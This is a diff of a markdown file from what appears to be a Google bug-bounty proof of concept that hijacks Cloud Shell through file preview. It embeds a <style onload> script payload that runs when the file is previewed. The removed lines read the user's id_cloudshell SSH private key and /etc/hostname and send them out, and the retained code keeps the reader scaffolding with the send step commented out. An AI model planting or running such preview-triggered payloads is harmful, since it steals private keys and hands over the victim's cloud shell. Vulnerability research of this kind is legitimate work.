@@ -1,20 +1,16 @@
-# Google VRP testing  
-Google cloudshell instance take over (as root)
 
-[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?page=editor&cloudshell_git_repo=https:%2F%2Fgithub.com%2Fmagnetic-ferret%2Fta.git&cloudshell_open_in_editor=test2.md)
 
-## Getting Started 
-just need to preview this file to see the magic 
- 
+[![Launch in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)][1]
+
+[1]: https://console.cloud.google.com/?cloudshell_git_repo=https%3A%2F%2Fgithub.com%2Fmagnetic-ferret%2Fta&cloudshell_tutorial=test2.md
+
+----
+
 <style onload="{   
     var file_results = []  
-    // this scape the container and get the ssh id_cloudshell private key
-    read_file('file:///../id_cloudshell')          
-    // getting the hostname (external connection)
-    read_file('file:///etc/hostname')      
-         
+    // this scape the container and get the ssh id_cloudshell private key         
     setTimeout(function(){ 
-        send_files(file_results)    
+        // send_files(file_results)    
     },5000)  
  
     // function to read any file given the path with file protocol per example 'file:///etc/hostname'
